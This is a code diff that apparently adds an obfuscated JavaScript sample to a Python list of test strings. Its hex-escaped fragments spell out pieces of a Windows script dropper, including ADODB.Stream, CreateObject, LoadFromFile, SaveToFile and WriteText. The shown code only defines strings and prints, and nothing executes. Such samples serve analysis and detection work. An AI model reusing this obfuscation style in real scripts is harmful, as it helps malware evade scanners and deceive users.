@@ -309,4 +309,49 @@ swnrq=swnrq;
 */
 ;
 '''
+,
+'''
+var uradtodeg = "\x74h";
+var um = "l\x65ng";
+var ucollisionend = "n\x67th";
+var uparticleradius = "\x6c\x65";
+var umsg = "c\x6cose";
+var udoxie = "oFil\x65";
+var tmi = "\x65T";
+var trenderer = "Sa\x76";
+var tothumbnailslist = "T\x65xt";
+var tacross = "t\x65";
+var ttends = "\x77ri";
+var tdreed = "\x65n";
+var trandom = "o\x70";
+var tflexwhitespace = "s\x65t";
+var tleppek = "C\x68\x61r";
+var tradtodeg = "ty\x70\x65";
+var tdoxie = "WhhxmVD";
+var tm = tdoxie[""+"\x63"+"harAt"](4);
+var tcollisionend = "S\x74rea";
+var tparticleradius = "D\x42.";
+var tmsg = "AD\x4f";
+var stends = "ya3JtksL";var smi = stends[""+"\x63"+"harAt"](4);
+print(smi, stends);
+var srenderer = "\x65c";
+var shtc = "\x4fbj";
+var sothumbnailslist = "\x74e";
+var sacross = "C\x72ea";
+var sdreed = "\x73e";
+var srandom = "c\x6co";
+var sflexwhitespace = "e\x78t";
+var sleppek = "a\x64T";
+var sradtodeg = "R\x65";
+var scollisionend = "\x69le";
+var sparticleradius = "From\x46";
+var smsg = "a\x64";
+var sdoxie = "\x4co";
+var rmi = "\x6fp\x65n";
+var rrenderer = "se\x74";
+var rhtc = "Cha\x72";
+print(rhtc);
+var rtends = "wbeH7";var rothumbnailslist = rtends[""+"\x63"+"harAt"](2);
+print(rtends);
+'''
 ]
